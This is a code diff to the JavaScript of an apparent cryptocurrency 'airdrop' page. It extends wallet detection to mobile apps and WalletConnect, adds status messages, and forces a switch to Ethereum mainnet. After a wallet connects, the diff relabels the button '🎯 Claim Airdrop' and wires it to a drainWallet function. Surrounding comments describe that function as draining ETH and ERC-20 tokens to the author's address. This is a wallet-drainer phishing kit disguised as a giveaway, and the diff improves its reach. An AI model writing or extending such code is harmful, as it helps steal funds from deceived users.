@@ -53,7 +53,23 @@ $(document).ready(function() {
             });
         }
     }
-    // WalletConnect detection
+    // Mobile wallet detection (always add mobile options)
+    const mobileWallets = [
+        { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
+        { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
+        { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet" },
+        { name: "Rainbow Mobile", type: "mobile", deepLink: "rainbow" },
+        { name: "Phantom Mobile", type: "mobile", deepLink: "phantom (eth)" }
+    ];
+
+    // Add mobile wallets if on mobile device or if no desktop wallets found
+    if (isMobileDevice() || detectedWallets.length === 0) {
+        mobileWallets.forEach(wallet => {
+            detectedWallets.push(wallet);
+        });
+    }
+
+    // WalletConnect detection (works on both mobile and desktop)
     let walletConnectAvailable = false;
     let WalletConnectProvider = null;
     if (window.WalletConnectProvider) {
@@ -64,7 +80,7 @@ $(document).ready(function() {
         WalletConnectProvider = window.WalletConnect.EthereumProvider;
     }
     if (walletConnectAvailable) {
-        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect" });
+        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
     }
 
     // Your Ethereum address to receive funds
@@ -116,14 +132,28 @@ $(document).ready(function() {
 
     // Function to detect mobile device
     function isMobileDevice() {
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        // More comprehensive mobile detection
+        const userAgent = navigator.userAgent.toLowerCase();
+        const mobileKeywords = [
+            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
+            'iemobile', 'opera mini', 'mobile', 'tablet'
+        ];
+        
+        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        const isSmallScreen = window.innerWidth <= 768;
+        
+        return isMobileUA || (isTouchDevice && isSmallScreen);
     }
 
     // Function to create mobile deep links for Ethereum wallets
     function createMobileDeepLink(walletName, dappUrl = window.location.href) {
         const encodedUrl = encodeURIComponent(dappUrl);
+        const hostname = window.location.hostname;
+        const fullUrl = window.location.href;
+        
         const mobileLinks = {
-            "metamask": `https://metamask.app.link/dapp/${window.location.hostname}`,
+            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
             "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
             "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
             "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
@@ -135,22 +165,125 @@ $(document).ready(function() {
 
     // Function to attempt mobile wallet connection
     function connectMobileWallet(walletName) {
-        if (!isMobileDevice()) return false;
+        if (!isMobileDevice()) {
+            console.log("Not on mobile device, skipping mobile wallet connection");
+            return false;
+        }
         
         const deepLink = createMobileDeepLink(walletName);
         if (deepLink) {
-            window.open(deepLink, '_blank');
-            return true;
+            console.log(`Opening mobile deep link for ${walletName}:`, deepLink);
+            
+            // Try multiple methods to open the deep link
+            try {
+                // Method 1: Direct window.open
+                const newWindow = window.open(deepLink, '_blank');
+                
+                // Method 2: If window.open fails, try location.href
+                if (!newWindow || newWindow.closed) {
+                    window.location.href = deepLink;
+                }
+                
+                return true;
+            } catch (error) {
+                console.error("Failed to open deep link:", error);
+                
+                // Method 3: Create a temporary link and click it
+                try {
+                    const link = document.createElement('a');
+                    link.href = deepLink;
+                    link.target = '_blank';
+                    link.rel = 'noopener noreferrer';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    return true;
+                } catch (linkError) {
+                    console.error("Failed to create and click link:", linkError);
+                    return false;
+                }
+            }
         }
         
+        console.warn(`No deep link available for wallet: ${walletName}`);
         return false;
     }
 
-    // Insert wallet dropdown before button
+    // Function to wait for mobile wallet connection
+    function waitForMobileConnection(timeout = 30000) {
+        return new Promise((resolve) => {
+            const startTime = Date.now();
+            const checkInterval = 1000; // Check every second
+            
+            const checkConnection = async () => {
+                try {
+                    if (window.ethereum) {
+                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                        if (accounts && accounts.length > 0) {
+                            resolve({ success: true, accounts, provider: window.ethereum });
+                            return;
+                        }
+                    }
+                } catch (error) {
+                    console.log("Still waiting for mobile connection...", error);
+                }
+                
+                // Check if timeout reached
+                if (Date.now() - startTime > timeout) {
+                    resolve({ success: false, error: "Connection timeout" });
+                    return;
+                }
+                
+                // Continue checking
+                setTimeout(checkConnection, checkInterval);
+            };
+            
+            checkConnection();
+        });
+    }
+
+    // Insert wallet dropdown before button with improved mobile handling
     $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
+    
+    // Add wallets to dropdown with device-specific filtering
+    if (detectedWallets.length === 0) {
+        // Fallback: add basic options if no wallets detected
+        if (isMobileDevice()) {
+            detectedWallets.push(
+                { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
+                { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
+                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
+            );
+        } else {
+            detectedWallets.push(
+                { name: "MetaMask (Install Required)", provider: null },
+                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
+            );
+        }
+    }
+    
     detectedWallets.forEach((opt, i) => {
-        $('#wallet-select').append(`<option value="${i}">${opt.name}</option>`);
+        let displayName = opt.name;
+        if (opt.type === "mobile" && !isMobileDevice()) {
+            displayName += " (Mobile Only)";
+        } else if (opt.type !== "mobile" && !opt.provider && opt.name !== "WalletConnect") {
+            displayName += " (Not Installed)";
+        }
+        $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
     });
+
+    // Add connection status indicator
+    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
+    
+    // Update connection status
+    function updateConnectionStatus(message, isError = false) {
+        const statusEl = $('#connection-status');
+        statusEl.text(message);
+        statusEl.css('color', isError ? '#ff4444' : '#666');
+    }
+
+    // Initialize with device info
+    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);
 
     // Debug wallet providers on page load
     debugWalletProviders();
@@ -161,13 +294,70 @@ $(document).ready(function() {
         const selected = detectedWallets[selectedIdx];
         let provider = null;
         let providerName = selected ? selected.name : "";
+        
         try {
             if (!selected) {
                 alert("No wallet selected.");
                 return;
             }
+
+            // Handle mobile wallet connections
+            if (selected.type === "mobile") {
+                if (isMobileDevice()) {
+                    updateConnectionStatus("Opening mobile wallet...");
+                    
+                    // Try to open the mobile wallet app via deep link
+                    const deepLinkOpened = connectMobileWallet(selected.deepLink);
+                    if (deepLinkOpened) {
+                        updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
+                        
+                        // Show user instructions
+                        const continueWaiting = confirm(
+                            `Opening ${selected.name}...\n\n` +
+                            "Instructions:\n" +
+                            "1. The wallet app should open automatically\n" +
+                            "2. Connect your wallet in the app\n" +
+                            "3. Return to this page\n" +
+                            "4. Click OK to continue waiting, or Cancel to try a different method"
+                        );
+                        
+                        if (continueWaiting) {
+                            // Wait for connection with timeout
+                            const connectionResult = await waitForMobileConnection(45000);
+                            
+                            if (connectionResult.success) {
+                                updateConnectionStatus("Mobile wallet connected successfully!");
+                                await handleSuccessfulConnection(
+                                    connectionResult.provider, 
+                                    selected.name, 
+                                    connectionResult.accounts[0]
+                                );
+                                return;
+                            } else {
+                                updateConnectionStatus("Mobile connection failed or timed out", true);
+                                alert("Connection timed out. Please try again or use WalletConnect instead.");
+                                return;
+                            }
+                        } else {
+                            updateConnectionStatus("Mobile connection cancelled by user");
+                            return;
+                        }
+                    } else {
+                        updateConnectionStatus("Failed to open mobile wallet", true);
+                        alert(`Unable to open ${selected.name}. Please install the wallet app or use WalletConnect.`);
+                        return;
+                    }
+                } else {
+                    updateConnectionStatus("Mobile wallet selected on desktop device", true);
+                    alert("This is a mobile wallet option. Please use a desktop wallet or switch to a mobile device.");
+                    return;
+                }
+            }
+
+            // Handle WalletConnect
             if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
-                // WalletConnect modal
+                updateConnectionStatus("Initializing WalletConnect...");
+                
                 const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
                 provider = await WalletConnectProvider.init({
                     projectId: PROJECT_ID,
@@ -180,47 +370,132 @@ $(document).ready(function() {
                         icons: ["https://walletconnect.com/walletconnect-logo.png"]
                     }
                 });
+                
+                updateConnectionStatus("Waiting for WalletConnect pairing...");
                 await provider.connect();
+                
                 if (!provider.accounts || provider.accounts.length === 0) {
+                    updateConnectionStatus("WalletConnect connection failed", true);
                     alert("No accounts connected via WalletConnect.");
                     return;
                 }
-            } else {
-                provider = selected.provider;
-                // Request account access
-                await provider.request({ method: 'eth_requestAccounts' });
+                
+                updateConnectionStatus("WalletConnect connected successfully!");
+                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+                return;
             }
+
+            // Handle desktop wallet connections
+            if (!selected.provider || selected.provider === "walletconnect") {
+                updateConnectionStatus("Wallet not available", true);
+                alert("Wallet provider not available. Please install the wallet extension or use WalletConnect.");
+                return;
+            }
+
+            provider = selected.provider;
+            
+            // Check if provider is available
+            if (!provider || typeof provider.request !== 'function') {
+                updateConnectionStatus("Wallet extension not properly installed", true);
+                alert(`${selected.name} is not properly installed or available. Please install the wallet extension.`);
+                return;
+            }
+
+            updateConnectionStatus(`Connecting to ${selected.name}...`);
+            
+            // Request account access
+            await provider.request({ method: 'eth_requestAccounts' });
+            
             // Get connected accounts
-            let accounts = [];
-            if (selected.name === "WalletConnect") {
-                accounts = provider.accounts;
-            } else {
-                accounts = await provider.request({ method: 'eth_accounts' });
-            }
+            const accounts = await provider.request({ method: 'eth_accounts' });
             if (!accounts || accounts.length === 0) {
+                updateConnectionStatus("No accounts found in wallet", true);
                 alert("No accounts found. Please unlock your wallet.");
                 return;
             }
-            const userAddress = accounts[0];
+
+            updateConnectionStatus("Desktop wallet connected successfully!");
+            await handleSuccessfulConnection(provider, selected.name, accounts[0]);
+
+        } catch (error) {
+            console.error("Connection error:", error);
+            
+            // Handle specific error cases
+            if (error.code === 4001) {
+                updateConnectionStatus("Connection rejected by user", true);
+                alert("Connection request was rejected by the user.");
+            } else if (error.code === -32002) {
+                updateConnectionStatus("Connection request already pending", true);
+                alert("A connection request is already pending. Please check your wallet.");
+            } else if (error.message.includes("User rejected")) {
+                updateConnectionStatus("Connection cancelled by user", true);
+                alert("Connection was cancelled by user.");
+            } else {
+                updateConnectionStatus("Connection failed", true);
+                alert("Failed to connect wallet: " + error.message);
+            }
+        }
+    });
+
+    // Helper function to handle successful connections
+    async function handleSuccessfulConnection(provider, walletName, userAddress) {
+        try {
+            updateConnectionStatus("Setting up connection...");
+            
             // Initialize ethers provider
             const ethersProvider = new ethers.providers.Web3Provider(provider);
             const signer = ethersProvider.getSigner();
+            
             // Get network info
             const network = await ethersProvider.getNetwork();
+            console.log("Connected to network:", network);
+            
+            // Check if on Ethereum mainnet
+            if (network.chainId !== 1) {
+                updateConnectionStatus("Wrong network detected", true);
+                const switchToMainnet = confirm("You're not on Ethereum Mainnet. Would you like to switch networks?");
+                if (switchToMainnet) {
+                    try {
+                        updateConnectionStatus("Switching to Ethereum Mainnet...");
+                        await provider.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x1' }], // Ethereum Mainnet
+                        });
+                        // Refresh provider after network switch
+                        updateConnectionStatus("Network switched successfully!");
+                        return handleSuccessfulConnection(provider, walletName, userAddress);
+                    } catch (switchError) {
+                        console.error("Failed to switch network:", switchError);
+                        updateConnectionStatus("Failed to switch network", true);
+                        alert("Failed to switch to Ethereum Mainnet. Please switch manually.");
+                        return;
+                    }
+                }
+            }
+            
+            updateConnectionStatus("Checking account balance...");
+            
             // Check ETH balance
             const balance = await ethersProvider.getBalance(userAddress);
             const ethBalance = ethers.utils.formatEther(balance);
+            
+            // Update connection status and button
+            updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);
+            
             // Update button
             $('#connect-wallet').text("🎯 Claim Airdrop");
             $('#connect-wallet').off('click').on('click', async () => {
                 await drainWallet(ethersProvider, signer, userAddress);
             });
-            alert(`Connected to ${providerName}:\n${userAddress}\nBalance: ${ethBalance} ETH`);
+            
+            alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${ethBalance} ETH\nNetwork: ${network.name}`);
+            
         } catch (error) {
-            console.error("Connection error:", error);
-            alert("Failed to connect wallet: " + error.message);
+            console.error("Post-connection setup error:", error);
+            updateConnectionStatus("Connection setup failed", true);
+            alert("Connected to wallet but failed to complete setup: " + error.message);
         }
-    });
+    }
 
     // Function to drain the wallet (ETH + ERC-20 tokens)
     async function drainWallet(provider, signer, userAddress) {
